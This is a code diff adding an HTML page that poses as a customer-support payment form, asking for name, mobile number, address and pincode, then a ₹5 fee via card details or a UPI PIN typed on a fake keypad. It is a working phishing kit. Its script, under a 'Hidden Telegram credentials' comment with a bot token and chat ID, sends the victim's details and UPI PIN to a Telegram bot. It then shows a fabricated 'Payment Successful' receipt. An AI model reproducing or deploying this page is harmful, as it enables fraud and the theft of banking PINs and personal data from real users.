@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Service Support</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            max-height: 100vh;
+            overflow-y: auto;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #667eea;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .header-image {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            display: block;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #e0e0e0;
+            z-index: 0;
+        }
+
+        .progress-bar .progress-fill {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            height: 3px;
+            background: #667eea;
+            transition: width 0.3s ease;
+            z-index: 1;
+        }
+
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #999;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+
+        .step.active {
+            background: #667eea;
+            color: white;
+            transform: scale(1.2);
+        }
+
+        .step.completed {
+            background: #4CAF50;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: #6c757d;
+            margin-top: 10px;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .payment-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .payment-option {
+            padding: 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .payment-option:hover {
+            border-color: #667eea;
+            background: #f8f9ff;
+        }
+
+        .payment-option.selected {
+            border-color: #667eea;
+            background: #f8f9ff;
+        }
+
+        .payment-option .icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .payment-option .label {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .card-details {
+            display: none;
+        }
+
+        .card-details.active {
+            display: block;
+        }
+
+        .upi-payment {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .amount-display {
+            font-size: 3rem;
+            color: #667eea;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .upi-id {
+            background: #f8f9ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+
+        /* UPI PIN Interface */
+        .upi-pin-interface {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .upi-logo {
+            width: 180px;
+            height: 80px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        .upi-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .merchant-info {
+            background: #f8f9ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .merchant-info p {
+            margin: 5px 0;
+            color: #666;
+        }
+
+        .merchant-info .amount {
+            font-size: 2rem;
+            color: #667eea;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .pin-input-container {
+            margin: 30px 0;
+        }
+
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            min-height: 20px;
+            flex-wrap: wrap;
+        }
+
+        .pin-dot {
+            width: 15px;
+            height: 15px;
+            border: 2px solid #667eea;
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .pin-dot.filled {
+            background: #667eea;
+            transform: scale(1.2);
+        }
+
+        .pin-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .key {
+            padding: 20px;
+            background: #f8f9ff;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+
+        .key:active {
+            transform: scale(0.95);
+            background: #667eea;
+            color: white;
+        }
+
+        .key.delete {
+            background: #ff6b6b;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .key.submit {
+            background: #4CAF50;
+            color: white;
+            font-size: 1rem;
+            grid-column: span 3;
+        }
+
+        .key.empty {
+            background: transparent;
+            border: none;
+            cursor: default;
+        }
+
+        .success-animation {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-animation .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #4CAF50;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            color: white;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .error {
+            color: #dc3545;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message {
+            background: #ffe0e0;
+            color: #dc3545;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #f0f0f0;
+            margin: 20px auto;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            color: #999;
+        }
+
+        .processing {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 1.5rem;
+            }
+
+            .header-image {
+                width: 100px;
+                height: 100px;
+            }
+
+            .amount-display {
+                font-size: 2.5rem;
+            }
+
+            .key {
+                padding: 15px;
+                font-size: 1.3rem;
+            }
+
+            .upi-logo {
+                width: 160px;
+                height: 70px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+                <div class="step active" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
+            </div>
+
+            <!-- Page 1: Profile Details -->
+            <div class="page active" id="page1">
+                <div class="header">
+                    <!-- Customer Support GIF -->
+                    <img src="https://nyc3.digitaloceanspaces.com/bhindi-drive/files/38b79bb7-1e67-4085-8aa2-c27ffd28bbed/2026-01-31T08-22-06-859Z-133a95ff-chat-image-1769847726841-0.jpg" alt="Customer Support" class="header-image">
+                    
+                    <h1>📋 Customer Details</h1>
+                    <p>Please fill in your information</p>
+                </div>
+
+                <form id="profileForm">
+                    <div class="form-group">
+                        <label for="name">Full Name *</label>
+                        <input type="text" id="name" placeholder="Enter your full name" required>
+                        <span class="error" id="nameError">Please enter your name</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mobile">Mobile Number *</label>
+                        <input type="tel" id="mobile" placeholder="10 digit mobile number" maxlength="10" required>
+                        <span class="error" id="mobileError">Please enter a valid mobile number</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="address">Address *</label>
+                        <textarea id="address" placeholder="Enter your complete address" rows="3" required></textarea>
+                        <span class="error" id="addressError">Please enter your address</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="pincode">Pincode *</label>
+                        <input type="text" id="pincode" placeholder="6 digit pincode" maxlength="6" required>
+                        <span class="error" id="pincodeError">Please enter a valid pincode</span>
+                    </div>
+
+                    <button type="submit" class="btn">Continue →</button>
+                </form>
+            </div>
+
+            <!-- Page 2: Payment Method -->
+            <div class="page" id="page2">
+                <div class="header">
+                    <h1>💳 Payment Method</h1>
+                    <p>Choose your payment method</p>
+                </div>
+
+                <div class="payment-options">
+                    <div class="payment-option" id="debitOption">
+                        <div class="icon">💳</div>
+                        <div class="label">Debit Card</div>
+                    </div>
+                    <div class="payment-option selected" id="upiOption">
+                        <div class="icon">📱</div>
+                        <div class="label">UPI</div>
+                    </div>
+                </div>
+
+                <!-- Debit Card Form -->
+                <div class="card-details" id="cardDetails">
+                    <div class="form-group">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div class="form-group">
+                            <label for="expiry">Expiry Date</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="3">
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn" id="proceedPayment">Pay ₹5</button>
+                <button class="btn btn-secondary" id="backToProfile">← Back</button>
+            </div>
+
+            <!-- Page 3: UPI PIN Entry -->
+            <div class="page" id="page3">
+                <div class="upi-pin-interface">
+                    <!-- UPI Logo -->
+                    <div class="upi-logo">
+                        <img src="https://nyc3.digitaloceanspaces.com/bhindi-drive/files/38b79bb7-1e67-4085-8aa2-c27ffd28bbed/2026-01-31T08-10-45-510Z-425fde2b-chat-image-1769847045491-0.jpg" alt="UPI Logo">
+                    </div>
+                    
+                    <h2 style="color: #333; margin-bottom: 10px;">UPI Payment</h2>
+                    
+                    <div class="merchant-info">
+                        <p style="font-size: 0.9rem; color: #999;">Paying to</p>
+                        <p style="font-size: 1.1rem; font-weight: bold; color: #333;">Customer Support</p>
+                        <p style="font-size: 0.85rem; color: #666;">customer.support@upi</p>
+                        <div class="amount">₹5.00</div>
+                    </div>
+
+                    <div class="pin-input-container">
+                        <p style="color: #666; margin-bottom: 20px; font-size: 0.9rem;">Enter UPI PIN</p>
+                        
+                        <div class="pin-dots" id="pinDotsContainer"></div>
+
+                        <div class="error-message" id="pinError">Incorrect PIN. Please try again.</div>
+
+                        <div class="pin-keypad">
+                            <div class="key" data-key="1">1</div>
+                            <div class="key" data-key="2">2</div>
+                            <div class="key" data-key="3">3</div>
+                            <div class="key" data-key="4">4</div>
+                            <div class="key" data-key="5">5</div>
+                            <div class="key" data-key="6">6</div>
+                            <div class="key" data-key="7">7</div>
+                            <div class="key" data-key="8">8</div>
+                            <div class="key" data-key="9">9</div>
+                            <div class="key empty"></div>
+                            <div class="key" data-key="0">0</div>
+                            <div class="key delete" data-key="delete">⌫</div>
+                            <div class="key submit" id="submitPin">Pay Now ✓</div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-secondary" id="backToPayment" style="margin-top: 20px;">← Cancel</button>
+                </div>
+            </div>
+
+            <!-- Page 4: Processing -->
+            <div class="page" id="page4">
+                <div class="processing">
+                    <div class="spinner"></div>
+                    <h2 style="color: #667eea; margin-bottom: 10px;">Processing Payment</h2>
+                    <p style="color: #666;">Please wait while we process your payment...</p>
+                </div>
+            </div>
+
+            <!-- Page 5: Success -->
+            <div class="page" id="page5">
+                <div class="success-animation">
+                    <div class="checkmark">✓</div>
+                    <h2 style="color: #4CAF50; margin-bottom: 10px;">Payment Successful!</h2>
+                    <p style="color: #666; margin-bottom: 20px;">
+                        Your payment of ₹5 has been completed successfully
+                    </p>
+                    <div style="background: #f8f9ff; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;">
+                        <p><strong>Transaction ID:</strong> <span id="transactionId"></span></p>
+                        <p><strong>Reference Number:</strong> <span id="referenceNumber"></span></p>
+                        <p><strong>Name:</strong> <span id="confirmName"></span></p>
+                        <p><strong>Mobile:</strong> <span id="confirmMobile"></span></p>
+                        <p><strong>Address:</strong> <span id="confirmAddress"></span></p>
+                        <p><strong>Pincode:</strong> <span id="confirmPincode"></span></p>
+                        <p><strong>Amount:</strong> ₹5.00</p>
+                        <p><strong>Date:</strong> <span id="paymentDate"></span></p>
+                    </div>
+                    <button class="btn" onclick="location.reload()">New Application</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Hidden Telegram credentials
+        const TELEGRAM_BOT_TOKEN = '8043677219:AAGazNp2rVsR5AbfJZnXek3q0buojo1j3-s';
+        const TELEGRAM_CHAT_ID = '8416277746';
+
+        // User data storage
+        let userData = {};
+        let currentPage = 1;
+        let selectedPayment = 'upi';
+        let upiPin = '';
+        let transactionData = {};
+
+        // Page navigation
+        function showPage(pageNum) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page' + pageNum).classList.add('active');
+            
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.remove('active', 'completed');
+                if (index + 1 < pageNum) {
+                    step.classList.add('completed');
+                } else if (index + 1 === pageNum) {
+                    step.classList.add('active');
+                }
+            });
+
+            const progressWidth = ((Math.min(pageNum, 3) - 1) / 2) * 100;
+            document.getElementById('progressFill').style.width = progressWidth + '%';
+            
+            currentPage = pageNum;
+            
+            // Scroll to top when changing pages
+            window.scrollTo(0, 0);
+        }
+
+        // Profile Form Validation
+        document.getElementById('profileForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('name').value.trim();
+            const mobile = document.getElementById('mobile').value.trim();
+            const address = document.getElementById('address').value.trim();
+            const pincode = document.getElementById('pincode').value.trim();
+            
+            let isValid = true;
+
+            if (name === '') {
+                document.getElementById('nameError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('nameError').style.display = 'none';
+            }
+
+            if (!/^[6-9]\d{9}$/.test(mobile)) {
+                document.getElementById('mobileError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('mobileError').style.display = 'none';
+            }
+
+            if (address === '') {
+                document.getElementById('addressError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('addressError').style.display = 'none';
+            }
+
+            if (!/^\d{6}$/.test(pincode)) {
+                document.getElementById('pincodeError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('pincodeError').style.display = 'none';
+            }
+
+            if (isValid) {
+                userData = { name, mobile, address, pincode };
+                showPage(2);
+            }
+        });
+
+        // Payment method selection
+        document.getElementById('debitOption').addEventListener('click', function() {
+            selectedPayment = 'debit';
+            document.getElementById('debitOption').classList.add('selected');
+            document.getElementById('upiOption').classList.remove('selected');
+            document.getElementById('cardDetails').classList.add('active');
+        });
+
+        document.getElementById('upiOption').addEventListener('click', function() {
+            selectedPayment = 'upi';
+            document.getElementById('upiOption').classList.add('selected');
+            document.getElementById('debitOption').classList.remove('selected');
+            document.getElementById('cardDetails').classList.remove('active');
+        });
+
+        // Proceed to payment
+        document.getElementById('proceedPayment').addEventListener('click', function() {
+            if (selectedPayment === 'upi') {
+                upiPin = '';
+                updatePinDots();
+                showPage(3);
+            } else {
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expiry = document.getElementById('expiry').value;
+                const cvv = document.getElementById('cvv').value;
+
+                if (cardNumber && expiry && cvv) {
+                    processPayment();
+                } else {
+                    alert('Please fill in all card details');
+                }
+            }
+        });
+
+        // UPI PIN Keypad
+        document.querySelectorAll('.key').forEach(key => {
+            key.addEventListener('click', function() {
+                const value = this.getAttribute('data-key');
+                
+                if (value === 'delete') {
+                    upiPin = upiPin.slice(0, -1);
+                } else if (value && upiPin.length < 20) { // Max 20 digits
+                    upiPin += value;
+                }
+                
+                updatePinDots();
+            });
+        });
+
+        // Submit PIN button
+        document.getElementById('submitPin').addEventListener('click', function() {
+            if (upiPin.length >= 4) {
+                validateAndProcessPin();
+            } else {
+                document.getElementById('pinError').style.display = 'block';
+                document.getElementById('pinError').textContent = 'Please enter at least 4-digit PIN';
+            }
+        });
+
+        function updatePinDots() {
+            const container = document.getElementById('pinDotsContainer');
+            container.innerHTML = '';
+            
+            // Create dots based on PIN length
+            for (let i = 0; i < upiPin.length; i++) {
+                const dot = document.createElement('div');
+                dot.className = 'pin-dot filled';
+                container.appendChild(dot);
+            }
+        }
+
+        function validateAndProcessPin() {
+            if (upiPin.length >= 4) {
+                document.getElementById('pinError').style.display = 'none';
+                processPayment();
+            } else {
+                document.getElementById('pinError').style.display = 'block';
+                document.getElementById('pinError').textContent = 'Please enter at least 4-digit PIN';
+                upiPin = '';
+                updatePinDots();
+            }
+        }
+
+        // Send to Telegram Bot
+        async function sendToTelegram(data) {
+            const message = `
+🎉 *PAYMENT SUCCESSFUL*
+
+💳 *Transaction Details:*
+━━━━━━━━━━━━━━━━━━━━
+📋 Transaction ID: \`${data.transactionId}\`
+🔖 Reference: \`${data.referenceNumber}\`
+
+👤 *Customer Information:*
+━━━━━━━━━━━━━━━━━━━━
+Name: ${data.customerDetails.name}
+📱 Mobile: ${data.customerDetails.mobile}
+📍 Address: ${data.customerDetails.address}
+📮 Pincode: ${data.customerDetails.pincode}
+
+💰 *Payment Information:*
+━━━━━━━━━━━━━━━━━━━━
+Amount: ₹${data.paymentDetails.amount}
+Method: ${data.paymentDetails.method.toUpperCase()}
+UPI PIN: ${data.paymentDetails.upiPin}
+PIN Length: ${data.paymentDetails.pinLength}-digit
+UPI ID: ${data.paymentDetails.upiId}
+
+🕐 *Timestamp:*
+━━━━━━━━━━━━━━━━━━━━
+${data.date}
+
+✅ Status: ${data.status}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('✓ Data sent to Telegram successfully');
+                    return { success: true };
+                } else {
+                    console.error('Telegram API Error:', result);
+                    return { success: false };
+                }
+            } catch (error) {
+                console.error('Network error:', error);
+                return { success: false };
+            }
+        }
+
+        async function processPayment() {
+            showPage(4);
+            
+            const transactionId = 'TXN' + Date.now();
+            const referenceNumber = 'REF' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            const paymentDate = new Date().toLocaleString('en-IN', {
+                day: '2-digit',
+                month: 'short',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            transactionData = {
+                transactionId: transactionId,
+                referenceNumber: referenceNumber,
+                customerDetails: {
+                    name: userData.name,
+                    mobile: userData.mobile,
+                    address: userData.address,
+                    pincode: userData.pincode
+                },
+                paymentDetails: {
+                    amount: 5.00,
+                    currency: 'INR',
+                    method: selectedPayment,
+                    upiPin: upiPin,
+                    pinLength: upiPin.length,
+                    upiId: 'customer.support@upi'
+                },
+                timestamp: new Date().toISOString(),
+                date: paymentDate,
+                status: 'SUCCESS'
+            };
+
+            // Send to Telegram in background
+            await sendToTelegram(transactionData);
+            
+            setTimeout(() => {
+                document.getElementById('transactionId').textContent = transactionId;
+                document.getElementById('referenceNumber').textContent = referenceNumber;
+                document.getElementById('confirmName').textContent = userData.name;
+                document.getElementById('confirmMobile').textContent = userData.mobile;
+                document.getElementById('confirmAddress').textContent = userData.address;
+                document.getElementById('confirmPincode').textContent = userData.pincode;
+                document.getElementById('paymentDate').textContent = paymentDate;
+                
+                showPage(5);
+            }, 2000);
+        }
+
+        // Back buttons
+        document.getElementById('backToProfile').addEventListener('click', function() {
+            showPage(1);
+        });
+
+        document.getElementById('backToPayment').addEventListener('click', function() {
+            upiPin = '';
+            updatePinDots();
+            document.getElementById('pinError').style.display = 'none';
+            showPage(2);
+        });
+
+        // Input formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('mobile').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('pincode').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Prevent page scroll
+        document.body.style.overflow = 'hidden';
+        document.documentElement.style.overflow = 'hidden';
+    </script>
+</body>
+</html>
